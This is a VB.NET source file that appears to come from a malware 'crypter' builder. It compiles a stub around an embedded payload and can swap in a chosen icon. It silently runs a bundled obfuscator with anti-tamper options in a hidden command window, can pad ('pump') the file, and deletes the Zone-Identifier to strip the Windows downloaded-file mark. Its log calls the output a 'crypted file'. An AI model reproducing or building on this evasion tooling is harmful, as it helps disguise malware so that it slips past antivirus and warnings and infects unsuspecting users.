Imports System.CodeDom.Compiler

Public Class Codedom


    Public Shared Sub Compiler(ByVal Path As String, ByVal Code As String)



        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String)
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/platform:anycpu /target:winexe"
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("system.data.dll")
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("system.dll")
            .ReferencedAssemblies.Add("system.Deployment.dll")
            .ReferencedAssemblies.Add("System.Drawing.dll")
            .ReferencedAssemblies.Add("System.Web.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")

            .ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
            .ReferencedAssemblies.Add(Application.ExecutablePath)

            .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Main.ResName + ".Resources")

            Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
            If Results.Errors.Count > 0 Then
                For Each E In Results.Errors
                    Main.txtLog.AppendText(E.ErrorText)
                Next
            Else

                If Main.chkIcon.Checked = True AndAlso Main.picIcon.ImageLocation <> "" Then
                    Main.txtLog.AppendText("Changing Icon..." + Environment.NewLine)
                    IconInjector.InjectIcon(Path, Main.picIcon.ImageLocation)
                End If

                IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor1)
                Dim Info As ProcessStartInfo = New ProcessStartInfo()
                Info.Arguments = "/C dotNET_Reactor.exe -file """ & Path & """ -antitamp 1  -obfuscation 1 -antitamp  1 -targetfile """ & Path & """"
                Info.WindowStyle = ProcessWindowStyle.Hidden
                Info.CreateNoWindow = True
                Info.WorkingDirectory = IO.Path.GetTempPath
                Info.FileName = "cmd.exe"
                Process.Start(Info)

                Threading.Thread.Sleep(2500)

                If Main.chkPump.Checked = True Then
                    Main.txtLog.AppendText("Pumping..." + Environment.NewLine)
                    Helper.Pumper(Path)
                End If

                If Main.chkZoneIden.Checked = True Then
                    Main.txtLog.AppendText("Deleting Zone-Identifier..." + Environment.NewLine)
                    Helper.DeleteZoneIdentifier(Path)
                End If

                Threading.Thread.Sleep(2500)
                Dim PayloadSize As New IO.FileInfo(Path)
                Dim sizeInBytes As Long = PayloadSize.Length / 1024
                Main.txtLog.AppendText("Done! Crypted file final size is " + sizeInBytes.ToString + " KB" + Environment.NewLine)
            End If
        End With

        Try
            IO.File.Delete(IO.Path.GetTempPath + "\" + Main.ResName + ".Resources")
            IO.File.Delete(Path + ".hash")
        Catch ex As Exception
        End Try

    End Sub


End Class
